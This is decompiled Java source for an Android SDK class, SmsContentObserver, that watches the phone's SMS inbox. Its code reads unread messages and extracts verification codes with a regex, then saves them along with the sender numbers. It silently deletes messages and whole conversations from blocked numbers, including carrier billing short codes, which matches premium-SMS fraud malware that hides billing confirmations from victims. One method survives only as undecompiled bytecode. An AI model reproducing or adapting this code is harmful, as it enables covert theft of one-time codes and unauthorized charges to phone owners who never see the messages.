package com.lp.sdk.yninterface.service;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import com.lepeng.data.UtilApplication;
import com.lepeng.utils.L;
import com.lepeng.utils.StrUtil;
import com.lp.sdk.yninterface.util.PreferencesUtils;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsContentObserver
  extends ContentObserver
{
  private String aT;
  private String aU;
  private String aV;
  private String aW;
  private String aX;
  private Context context;
  
  public SmsContentObserver(Context paramContext, Handler paramHandler)
  {
    super(paramHandler);
    this.context = paramContext;
  }
  
  public void deleteRelativeSMS(String paramString)
  {
    Object localObject = Uri.parse("content://sms");
    ContentResolver localContentResolver = this.context.getContentResolver();
    localObject = localContentResolver.query((Uri)localObject, null, null, null, "date DESC");
    for (;;)
    {
      if (!((Cursor)localObject).moveToNext()) {
        return;
      }
      String str = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("address"));
      ((Cursor)localObject).getLong(((Cursor)localObject).getColumnIndex("_id"));
      long l = ((Cursor)localObject).getLong(((Cursor)localObject).getColumnIndex("thread_id"));
      if (str.equals(paramString)) {
        localContentResolver.delete(Uri.parse("content://sms/conversations/" + Long.valueOf(l)), null, null);
      }
    }
  }
  
  public String getBaoyuesendnumber()
  {
    return this.aW;
  }
  
  public String getMobileText()
  {
    return this.aT;
  }
  
  public String getNumber()
  {
    return this.aU;
  }
  
  public String getSendNumber()
  {
    return this.aV;
  }
  
  public String getSmsBody()
  {
    return this.aX;
  }
  
  public void getSmsFromPhone(String paramString)
  {
    Object localObject1 = new ArrayList();
    ArrayList localArrayList = new ArrayList();
    Uri localUri = Uri.parse("content://sms/");
    if ((paramString != null) && (paramString.equals("12114"))) {
      deleteRelativeSMS(paramString);
    }
    if ((paramString != null) && (!paramString.equals("12114")))
    {
      ContentResolver localContentResolver = this.context.getContentResolver();
      Object localObject2 = localContentResolver.query(localUri, new String[] { "_id", "thread_id", "address", "body" }, "read = 0 ", null, "date DESC");
      for (;;)
      {
        long l1;
        long l2;
        String str;
        Object localObject3;
        Object localObject4;
        int j;
        try
        {
          boolean bool = ((Cursor)localObject2).moveToNext();
          if (!bool)
          {
            ((Cursor)localObject2).close();
            System.out.print(localArrayList.toString());
            System.out.print(((ArrayList)localObject1).toString());
            paramString = localArrayList.iterator();
            if (paramString.hasNext()) {
              break label716;
            }
            paramString = ((ArrayList)localObject1).iterator();
            if (paramString.hasNext()) {
              break label800;
            }
            return;
          }
          l1 = ((Cursor)localObject2).getLong(1);
          l2 = ((Cursor)localObject2).getLong(0);
          str = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("address"));
          if (str.startsWith(paramString))
          {
            localObject3 = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("body"));
            if (localObject3 != null)
            {
              Log.e("jjjjjjjjjjjjjjjjjjjjj", "jjjjjjjjjjjjjjjjjjjjjj");
              localObject4 = Pattern.compile("([a-zA-Z0-9]{4,6})");
              Log.e("BODY", (String)localObject3);
              setSmsBody((String)localObject3);
              PreferencesUtils.putString(this.context, "smsbody", (String)localObject3);
              if (!((String)localObject3).contains("验证码")) {
                break label560;
              }
              Matcher localMatcher = ((Pattern)localObject4).matcher(((String)localObject3).substring(((String)localObject3).indexOf("验证码"), ((String)localObject3).length()));
              if (!localMatcher.find()) {
                continue;
              }
              localObject3 = localMatcher.group(0);
              Log.e("yzminfo1==", (String)localObject3);
              setMobileText((String)localObject3);
              PreferencesUtils.putString(this.context, "mobileText", (String)localObject3);
              setSendNumber(str);
              PreferencesUtils.putString(this.context, "phoneNumber", str);
            }
          }
          if (UtilApplication.getInstance() != null) {
            L.e("短信读写器：未读消息有：" + l1 + "::" + str);
          }
          localObject3 = SMSCodeBroadcast.getShieldStrs();
          i = 0;
          if (i >= ((ArrayList)localObject3).size()) {
            continue;
          }
          localObject4 = ((String)((ArrayList)localObject3).get(i)).split(",");
          j = 0;
          if (j < localObject4.length) {
            break label603;
          }
          i += 1;
          continue;
          localObject3 = ((Pattern)localObject4).matcher(((String)localObject3).substring(0, ((String)localObject3).indexOf("验证码")));
          if (!((Matcher)localObject3).find()) {
            continue;
          }
          localObject3 = ((Matcher)localObject3).group(0);
          Log.e("yzminfo1==", (String)localObject3);
          setMobileText((String)localObject3);
          PreferencesUtils.putString(this.context, "mobileText", (String)localObject3);
          setSendNumber(str);
          PreferencesUtils.putString(this.context, "phoneNumber", str);
          continue;
          localObject3 = StrUtil.getyzm((String)localObject3);
        }
        finally
        {
          ((Cursor)localObject2).close();
        }
        label560:
        Log.e("yzminfo2==", (String)localObject3);
        setMobileText((String)localObject3);
        setSendNumber(str);
        PreferencesUtils.putString(this.context, "mobileText", (String)localObject3);
        continue;
        label603:
        if ((str.startsWith(localObject4[j])) || (str.startsWith("10658099")) || (str.startsWith("10086901")))
        {
          if (UtilApplication.getInstance() != null) {
            L.e("是需要屏蔽的号码，加到要删除的号码");
          }
          if (!localArrayList.contains(Long.valueOf(l2))) {
            localArrayList.add(Long.valueOf(l2));
          }
          if (!((ArrayList)localObject1).contains(Long.valueOf(l1)))
          {
            if (UtilApplication.getInstance() != null) {
              L.e("需要屏蔽的短信会话");
            }
            ((ArrayList)localObject1).add(Long.valueOf(l1));
          }
        }
        j += 1;
        continue;
        label716:
        localObject2 = (Long)paramString.next();
        int i = localContentResolver.delete(localUri, "_id=" + localObject2, null);
        if (UtilApplication.getInstance() != null)
        {
          L.e("删除号码:" + localObject2 + "成功，删除" + i + "条");
          continue;
          label800:
          localObject1 = (Long)paramString.next();
          if (((Long)localObject1).longValue() != -1L)
          {
            i = localContentResolver.delete(Uri.parse("content://sms/conversations/" + localObject1), null, null);
            if (UtilApplication.getInstance() != null) {
              L.e("删除对话" + localObject1 + "成功，删除" + i + "条");
            }
          }
        }
      }
    }
    getSmsInPhone();
  }
  
  /* Error */
  public void getSmsInPhone()
  {
    // Byte code:
    //   0: new 116	java/util/ArrayList
    //   3: dup
    //   4: invokespecial 119	java/util/ArrayList:<init>	()V
    //   7: astore 9
    //   9: new 116	java/util/ArrayList
    //   12: dup
    //   13: invokespecial 119	java/util/ArrayList:<init>	()V
    //   16: astore 11
    //   18: ldc 24
    //   20: invokestatic 30	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
    //   23: astore 10
    //   25: aload_0
    //   26: getfield 19	com/lp/sdk/yninterface/service/SmsContentObserver:context	Landroid/content/Context;
    //   29: invokevirtual 36	android/content/Context:getContentResolver	()Landroid/content/ContentResolver;
    //   32: astore 8
    //   34: new 76	java/lang/StringBuilder
    //   37: dup
    //   38: ldc_w 319
    //   41: invokestatic 322	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   44: invokespecial 80	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   47: ldc_w 324
    //   50: invokevirtual 245	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   53: invokevirtual 94	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   56: astore 12
    //   58: aload 8
    //   60: aload 10
    //   62: iconst_3
    //   63: anewarray 70	java/lang/String
    //   66: dup
    //   67: iconst_0
    //   68: ldc 62
    //   70: aastore
    //   71: dup
    //   72: iconst_1
    //   73: ldc 68
    //   75: aastore
    //   76: dup
    //   77: iconst_2
    //   78: ldc 52
    //   80: aastore
    //   81: aload 12
    //   83: aconst_null
    //   84: ldc 38
    //   86: invokevirtual 44	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   89: astore 12
    //   91: aload 12
    //   93: invokeinterface 327 1 0
    //   98: pop
    //   99: aload 12
    //   101: invokeinterface 50 1 0
    //   106: istore_3
    //   107: iload_3
    //   108: ifne +69 -> 177
    //   111: aload 12
    //   113: invokeinterface 132 1 0
    //   118: getstatic 138	java/lang/System:out	Ljava/io/PrintStream;
    //   121: aload 11
    //   123: invokevirtual 139	java/util/ArrayList:toString	()Ljava/lang/String;
    //   126: invokevirtual 144	java/io/PrintStream:print	(Ljava/lang/String;)V
    //   129: getstatic 138	java/lang/System:out	Ljava/io/PrintStream;
    //   132: aload 9
    //   134: invokevirtual 139	java/util/ArrayList:toString	()Ljava/lang/String;
    //   137: invokevirtual 144	java/io/PrintStream:print	(Ljava/lang/String;)V
    //   140: aload 11
    //   142: invokevirtual 148	java/util/ArrayList:iterator	()Ljava/util/Iterator;
    //   145: astore 11
    //   147: aload 11
    //   149: invokeinterface 153 1 0
    //   154: ifne +279 -> 433
    //   157: aload 9
    //   159: invokevirtual 148	java/util/ArrayList:iterator	()Ljava/util/Iterator;
    //   162: astore 9
    //   164: aload 9
    //   166: invokeinterface 153 1 0
    //   171: istore_3
    //   172: iload_3
    //   173: ifne +345 -> 518
    //   176: return
    //   177: aload 12
    //   179: iconst_1
    //   180: invokeinterface 66 2 0
    //   185: lstore 4
    //   187: aload 12
    //   189: iconst_0
    //   190: invokeinterface 66 2 0
    //   195: lstore 6
    //   197: aload 12
    //   199: aload 12
    //   201: ldc 52
    //   203: invokeinterface 56 2 0
    //   208: invokeinterface 60 2 0
    //   213: astore 13
    //   215: invokestatic 235	com/lepeng/data/UtilApplication:getInstance	()Lcom/lepeng/data/UtilApplication;
    //   218: ifnull +33 -> 251
    //   221: new 76	java/lang/StringBuilder
    //   224: dup
    //   225: ldc -19
    //   227: invokespecial 80	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   230: lload 4
    //   232: invokevirtual 240	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   235: ldc -14
    //   237: invokevirtual 245	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   240: aload 13
    //   242: invokevirtual 245	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   245: invokevirtual 94	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   248: invokestatic 249	com/lepeng/utils/L:e	(Ljava/lang/String;)V
    //   251: invokestatic 255	com/lp/sdk/yninterface/service/SMSCodeBroadcast:getShieldStrs	()Ljava/util/ArrayList;
    //   254: astore 14
    //   256: iconst_0
    //   257: istore_1
    //   258: iload_1
    //   259: aload 14
    //   261: invokevirtual 258	java/util/ArrayList:size	()I
    //   264: if_icmpge -165 -> 99
    //   267: aload 14
    //   269: iload_1
    //   270: invokevirtual 262	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   273: checkcast 70	java/lang/String
    //   276: ldc_w 264
    //   279: invokevirtual 268	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   282: astore 15
    //   284: iconst_0
    //   285: istore_2
    //   286: iload_2
    //   287: aload 15
    //   289: arraylength
    //   290: if_icmplt +10 -> 300
    //   293: iload_1
    //   294: iconst_1
    //   295: iadd
    //   296: istore_1
    //   297: goto -39 -> 258
    //   300: aload 13
    //   302: aload 15
    //   304: iload_2
    //   305: aaload
    //   306: invokevirtual 157	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   309: ifne +25 -> 334
    //   312: aload 13
    //   314: ldc_w 278
    //   317: invokevirtual 157	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   320: ifne +14 -> 334
    //   323: aload 13
    //   325: ldc_w 280
    //   328: invokevirtual 157	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   331: ifeq +75 -> 406
    //   334: invokestatic 235	com/lepeng/data/UtilApplication:getInstance	()Lcom/lepeng/data/UtilApplication;
    //   337: ifnull +9 -> 346
    //   340: ldc_w 282
    //   343: invokestatic 249	com/lepeng/utils/L:e	(Ljava/lang/String;)V
    //   346: aload 11
    //   348: lload 6
    //   350: invokestatic 86	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   353: invokevirtual 284	java/util/ArrayList:contains	(Ljava/lang/Object;)Z
    //   356: ifne +14 -> 370
    //   359: aload 11
    //   361: lload 6
    //   363: invokestatic 86	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   366: invokevirtual 287	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   369: pop
    //   370: aload 9
    //   372: lload 4
    //   374: invokestatic 86	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   377: invokevirtual 284	java/util/ArrayList:contains	(Ljava/lang/Object;)Z
    //   380: ifne +26 -> 406
    //   383: invokestatic 235	com/lepeng/data/UtilApplication:getInstance	()Lcom/lepeng/data/UtilApplication;
    //   386: ifnull +9 -> 395
    //   389: ldc_w 289
    //   392: invokestatic 249	com/lepeng/utils/L:e	(Ljava/lang/String;)V
    //   395: aload 9
    //   397: lload 4
    //   399: invokestatic 86	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   402: invokevirtual 287	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   405: pop
    //   406: iload_2
    //   407: iconst_1
    //   408: iadd
    //   409: istore_2
    //   410: goto -124 -> 286
    //   413: astore 8
    //   415: aload 12
    //   417: invokeinterface 132 1 0
    //   422: aload 8
    //   424: athrow
    //   425: astore 8
    //   427: aload 8
    //   429: invokevirtual 330	java/lang/Exception:printStackTrace	()V
    //   432: return
    //   433: aload 11
    //   435: invokeinterface 293 1 0
    //   440: checkcast 82	java/lang/Long
    //   443: astore 12
    //   445: aload 8
    //   447: aload 10
    //   449: new 76	java/lang/StringBuilder
    //   452: dup
    //   453: ldc_w 295
    //   456: invokespecial 80	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   459: aload 12
    //   461: invokevirtual 90	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   464: invokevirtual 94	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   467: aconst_null
    //   468: invokevirtual 98	android/content/ContentResolver:delete	(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    //   471: istore_1
    //   472: invokestatic 235	com/lepeng/data/UtilApplication:getInstance	()Lcom/lepeng/data/UtilApplication;
    //   475: ifnull -328 -> 147
    //   478: new 76	java/lang/StringBuilder
    //   481: dup
    //   482: ldc_w 297
    //   485: invokespecial 80	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   488: aload 12
    //   490: invokevirtual 90	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   493: ldc_w 299
    //   496: invokevirtual 245	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   499: iload_1
    //   500: invokevirtual 302	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   503: ldc_w 304
    //   506: invokevirtual 245	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   509: invokevirtual 94	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   512: invokestatic 249	com/lepeng/utils/L:e	(Ljava/lang/String;)V
    //   515: goto -368 -> 147
    //   518: aload 9
    //   520: invokeinterface 293 1 0
    //   525: checkcast 82	java/lang/Long
    //   528: astore 10
    //   530: aload 10
    //   532: invokevirtual 308	java/lang/Long:longValue	()J
    //   535: ldc2_w 309
    //   538: lcmp
    //   539: ifeq -375 -> 164
    //   542: aload 8
    //   544: new 76	java/lang/StringBuilder
    //   547: dup
    //   548: ldc 78
    //   550: invokespecial 80	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   553: aload 10
    //   555: invokevirtual 90	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   558: invokevirtual 94	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   561: invokestatic 30	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
    //   564: aconst_null
    //   565: aconst_null
    //   566: invokevirtual 98	android/content/ContentResolver:delete	(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    //   569: istore_1
    //   570: invokestatic 235	com/lepeng/data/UtilApplication:getInstance	()Lcom/lepeng/data/UtilApplication;
    //   573: ifnull -409 -> 164
    //   576: new 76	java/lang/StringBuilder
    //   579: dup
    //   580: ldc_w 312
    //   583: invokespecial 80	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   586: aload 10
    //   588: invokevirtual 90	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   591: ldc_w 299
    //   594: invokevirtual 245	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   597: iload_1
    //   598: invokevirtual 302	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   601: ldc_w 304
    //   604: invokevirtual 245	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   607: invokevirtual 94	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   610: invokestatic 249	com/lepeng/utils/L:e	(Ljava/lang/String;)V
    //   613: goto -449 -> 164
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	616	0	this	SmsContentObserver
    //   257	341	1	i	int
    //   285	125	2	j	int
    //   106	67	3	bool	boolean
    //   185	213	4	l1	long
    //   195	167	6	l2	long
    //   32	27	8	localContentResolver	ContentResolver
    //   413	10	8	localObject1	Object
    //   425	118	8	localException	Exception
    //   7	512	9	localObject2	Object
    //   23	564	10	localObject3	Object
    //   16	418	11	localObject4	Object
    //   56	433	12	localObject5	Object
    //   213	111	13	str	String
    //   254	14	14	localArrayList	ArrayList
    //   282	21	15	arrayOfString	String[]
    // Exception table:
    //   from	to	target	type
    //   99	107	413	finally
    //   177	251	413	finally
    //   251	256	413	finally
    //   258	284	413	finally
    //   286	293	413	finally
    //   300	334	413	finally
    //   334	346	413	finally
    //   346	370	413	finally
    //   370	395	413	finally
    //   395	406	413	finally
    //   18	99	425	java/lang/Exception
    //   111	147	425	java/lang/Exception
    //   147	164	425	java/lang/Exception
    //   164	172	425	java/lang/Exception
    //   415	425	425	java/lang/Exception
    //   433	515	425	java/lang/Exception
    //   518	613	425	java/lang/Exception
  }
  
  public void onChange(boolean paramBoolean)
  {
    System.err.println("短信内容变化");
    super.onChange(paramBoolean);
    getSmsFromPhone(getNumber());
  }
  
  public void setBaoyuesendnumber(String paramString)
  {
    this.aW = paramString;
  }
  
  public void setMobileText(String paramString)
  {
    this.aT = paramString;
  }
  
  public void setNumber(String paramString)
  {
    this.aU = paramString;
  }
  
  public void setSendNumber(String paramString)
  {
    this.aV = paramString;
  }
  
  public void setSmsBody(String paramString)
  {
    this.aX = paramString;
  }
}
